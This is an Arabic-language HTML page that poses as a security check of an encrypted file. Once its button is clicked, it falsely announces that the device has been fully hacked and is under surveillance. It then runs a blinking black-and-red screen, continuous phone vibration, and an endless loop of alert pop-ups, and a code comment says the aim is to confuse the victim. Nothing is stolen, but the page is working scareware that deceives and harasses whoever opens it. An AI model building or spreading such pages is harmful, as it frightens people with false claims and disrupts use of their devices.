<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <title>جاري فحص الملف المشفر...</title>
    <style>
        body {
            background-color: #fff;
            color: #333;
            font-family: sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: all 0.5s;
        }
        h1 { font-size: 3em; margin-bottom: 20px; }
        p { font-size: 1.2em; opacity: 0.8; }
        #main-btn {
            padding: 20px 40px;
            font-size: 1.5em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        #main-btn:hover { background-color: #0056b3; }
        
        .scare-mode {
            background-color: #000 !important;
            color: #ff0000 !important;
        }
        .scare-mode h1 { font-size: 4em; animation: blink 0.15s infinite; }
        .scare-mode p { color: #fff; }
        .scare-mode #main-btn { display: none; }
        
        @keyframes blink {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>

    <div id="loading-view">
        <h1>...جاري تحليل الملف</h1>
        <p>يرجى الانتظار، جاري التحقق من أمان الملف المشفر قبل الفتح.</p>
        <button id="main-btn">اضغط للبدء</button>
    </div>

    <script>
        const body = document.body;
        const btn = document.getElementById('main-btn');
        const loadingView = document.getElementById('loading-view');

        btn.addEventListener('click', function() {
            // 1. الدخول لوضع الرعب وتغيير الشاشة
            body.classList.add('scare-mode');
            document.title = "⚠️ تحذير: تم اختراق الجهاز!";
            loadingView.innerHTML = "<h1>⚠️ تم السيطرة على الجهاز بالكامل! ⚠️</h1><p>جميع بياناتك الآن تحت المراقبة...</p>";

            // 2. تفعيل الهزاز بشكل مكثف ومتواصل
            try {
                if (navigator.vibrate) {
                    // حلقة اهتزاز مستمرة لا تتوقف
                    setInterval(() => {
                        navigator.vibrate([300, 100, 300, 100, 500]);
                    }, 800);
                }
            } catch (e) { 
                console.log("Vibration error"); 
            }

            // 3. إطلاق رسائل تنبيه مزعجة ورا بعض لتربیك الضحية
            setTimeout(() => {
                alert("تحذير أمني خطير: تم رصد محاولة اختراق!");
                
                setInterval(() => {
                    alert("⚠️ جهازك يتعرض للهجوم الآن!");
                }, 1000);
            }, 300);
        });
    </script>
</body>
</html>
